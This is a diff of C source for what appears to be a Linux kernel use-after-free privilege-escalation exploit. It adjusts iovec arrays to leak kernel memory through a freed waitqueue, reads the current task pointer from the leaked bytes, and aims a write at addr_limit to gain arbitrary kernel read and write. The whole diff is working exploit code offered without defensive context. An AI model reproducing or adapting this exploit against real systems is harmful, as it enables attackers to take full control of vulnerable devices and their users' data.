@@ -47,7 +47,8 @@
 
 unsigned long kernel_read_ulong(unsigned long kaddr);
 
-void hexdump_memory(unsigned char *buf, size_t byte_count) {
+void hexdump_memory(void *_buf, size_t byte_count) {
+   unsigned char* buf = _buf;
   unsigned long byte_offset_start = 0;
   if (byte_count % 16)
     errx(1, "hexdump_memory called with non-full line");
@@ -94,10 +95,12 @@ void leak_data(void* leakBuffer, int leakAmount)
 
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_base = dataBuffer; 
   iovec_array[IOVEC_INDX_FOR_WQ-1].iov_len = PAGE; 
-  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer; 
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer;
   iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; /* spinlock: will turn to UAF_SPINLOCK */
   iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = dataBuffer; /* wq->task_list->next */
-  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = leakAmount+UAF_SPINLOCK; /* wq->task_list->prev */
+  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = leakAmount; /* wq->task_list->prev */
+  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void*)0xDEADBEEF; // we shouldn't get to here
+  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK; 
   
   int b;
   
@@ -167,7 +170,7 @@ void clobber_addr_limit(void)
   unsigned long second_write_chunk[] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
     2 * 0x10, /* iov_len (currently in use) */  // wq->task_list->prev
-    &testDatum, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
   
@@ -176,12 +179,14 @@ void clobber_addr_limit(void)
   };
 
   iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dataBuffer;
-  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = UAF_SPINLOCK; // spinlock
-  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = dataBuffer; // wq->task_list->next
-  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev
+  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; // spinlock: will turn to UAF_SPINLOCK
+  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = dataBuffer; // wq->task_list->next: will turn to address of task_list
+  iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to address of task_list
   iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = &testDatum; // dataBuffer;
   iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = sizeof(third_write_chunk); 
-  int totalLength = iovec_array[IOVEC_INDX_FOR_WQ].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = (void*)0xDEADBEEF;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = UAF_SPINLOCK;
+  int totalLength = iovec_array[IOVEC_INDX_FOR_WQ].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len;
  
   int socks[2];
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
@@ -229,7 +234,8 @@ void clobber_addr_limit(void)
     int recvmsg_result = recvmmsg(socks[0], &mmsg, 1, MSG_WAITALL, &timeout);  */
 
     printf("PARENT: testDatum = %lx\n", testDatum);
-    hexdump_memory(dataBuffer, 32);
+    hexdump_memory(dataBuffer, 16);
+    hexdump_memory(dataBuffer+UAF_SPINLOCK-16, 16);
   
   printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
       totalLength);
@@ -298,7 +304,7 @@ int main(int argc, char** argv) {
       memcpy(&current_ptr, leaked+0xe8, 8);
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
 //      printf("Clobbering addr_limit\n");
-//      clobber_addr_limit();
+ //     clobber_addr_limit();
   }
   free(leaked);
   
